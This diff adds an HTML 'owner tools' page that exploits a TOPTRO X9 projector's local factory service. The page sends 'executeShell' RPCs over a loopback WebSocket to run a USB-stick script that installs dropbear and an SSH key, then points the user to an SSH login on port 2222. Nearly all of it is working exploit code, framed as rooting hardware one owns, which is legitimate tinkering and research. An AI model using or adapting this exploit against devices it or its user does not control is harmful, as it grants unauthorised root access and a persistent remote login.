@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>X9 owner tools</title>
+<style>
+  :root { color-scheme: dark; }
+  body { font-family: system-ui, sans-serif; background: #0d1117; color: #e6edf3;
+         max-width: 720px; margin: 2rem auto; padding: 0 1rem; line-height: 1.5; }
+  h1 { font-size: 1.4rem; } h2 { font-size: 1.1rem; margin-top: 2rem; }
+  #log { background: #010409; border: 1px solid #30363d; border-radius: 6px;
+         padding: .8rem; height: 14rem; overflow-y: auto; font-family: ui-monospace, monospace;
+         font-size: .8rem; white-space: pre-wrap; }
+  button { background: #238636; color: #fff; border: 0; border-radius: 6px;
+           padding: .6rem 1.2rem; font-size: 1rem; cursor: pointer; margin-top: .8rem; }
+  button:disabled { background: #30363d; cursor: not-allowed; }
+  .warn { color: #f0883e; } .ok { color: #3fb950; } .err { color: #f85149; }
+  code { background: #161b22; padding: .1rem .3rem; border-radius: 4px; }
+</style>
+</head>
+<body>
+<h1>TOPTRO X9 — owner tools</h1>
+<p>This page runs <strong>on your projector's own browser</strong> and talks to the
+device's local factory service (<code>ws://127.0.0.1:7681</code>, loopback only).
+Nothing leaves your LAN. Only use this on hardware you own.</p>
+
+<h2>1. Run the USB-stick launcher</h2>
+<p>Prerequisite: a FAT32 stick prepared per the repo's <code>exploit/README.md</code>
+(MScript.sh, dropbear, your <code>authorized_keys</code>), inserted in the powered-on
+projector.</p>
+<button id="go">Execute stick launcher</button>
+
+<h2>2. Log</h2>
+<div id="log"></div>
+
+<h2>Troubleshooting</h2>
+<p id="mixed" class="warn" hidden>WebSocket to 127.0.0.1 was refused by the browser
+(mixed-content). Serve this page over plain HTTP instead: run
+<code>python3 tools/x9-cdp-shell.py</code> on any LAN machine and open
+<code>http://&lt;that-host&gt;:8089/</code> here.</p>
+
+<script>
+"use strict";
+const RPC_PATH = "/mtk.webui.tvCmd?name=FactoryMode";
+const logEl = document.getElementById("log");
+function log(msg, cls) {
+  const d = document.createElement("div");
+  if (cls) d.className = cls;
+  d.textContent = new Date().toTimeString().slice(0, 8) + "  " + msg;
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function rpc(method, params, timeoutMs) {
+  return new Promise((resolve, reject) => {
+    let ws;
+    try { ws = new WebSocket("ws://127.0.0.1:7681" + RPC_PATH); }
+    catch (e) { return reject(e); }
+    const to = setTimeout(() => { try { ws.close(); } catch (_) {} reject(new Error("timeout")); }, timeoutMs || 6000);
+    ws.onopen = () => ws.send(JSON.stringify({ id: 1, method: method, params: params }));
+    ws.onmessage = (ev) => {
+      let m = {}; try { m = JSON.parse(ev.data); } catch (_) {}
+      // replies and notifies both arrive here; resolve on an id match or a
+      // FACTORY_EXE_SHELL notify
+      if (m.id === 1) { clearTimeout(to); ws.close(); resolve(m); }
+      else if ((m.method || "").indexOf("FACTORY_EXE_SHELL") >= 0 || /execute/i.test(m.method || "")) {
+        clearTimeout(to); ws.close(); resolve(m);
+      }
+    };
+    ws.onerror = () => { clearTimeout(to); reject(new Error("ws error (blocked or service down)")); };
+  });
+}
+
+const MOUNTS = [];
+for (const base of ["/mnt/usb/", "/tmp/mnt/usb/"])
+  for (const dev of ["sda1", "sdb1", "sdc1", "sda", "sdb"])
+    MOUNTS.push(base + dev + "/MScript.sh");
+
+document.getElementById("go").onclick = async () => {
+  const btn = document.getElementById("go");
+  btn.disabled = true;
+  log("probing " + MOUNTS.length + " stick paths …");
+  let done = false;
+  for (const p of MOUNTS) {
+    try {
+      const r = await rpc("mtk.webui.factory.sys.executeShell", { scriptPath: p }, 5000);
+      const s = JSON.stringify(r);
+      if (/copy file failed|failed|-1/.test(s) && !/code\"\s*:\s*0/.test(s)) {
+        log("miss: " + p, "warn");
+        continue;
+      }
+      log("SENT: " + p, "ok");
+      log("reply: " + s.slice(0, 300));
+      done = true;
+      break;
+    } catch (e) {
+      log("miss: " + p + " (" + e.message + ")", "warn");
+    }
+  }
+  log(done ? "launcher executed — try ssh -p 2222 factoryservice@<projector-ip>"
+           : "no stick path accepted — is the stick FAT32 with MScript.sh at its root? did you cold-boot with it inserted?",
+       done ? "ok" : "err");
+  btn.disabled = false;
+};
+
+// connectivity precheck for a clearer failure mode
+(async () => {
+  try {
+    await rpc("mtk.webui.factory.sys.queryEmmcEnvVar", { key: "bootdelay" }, 3000);
+    log("factory RPC reachable", "ok");
+  } catch (e) {
+    log("factory RPC NOT reachable: " + e.message, "err");
+    if (/blocked|mixed/i.test(e.message) || location.protocol === "https:")
+      document.getElementById("mixed").hidden = false;
+  }
+})();
+</script>
+</body>
+</html>
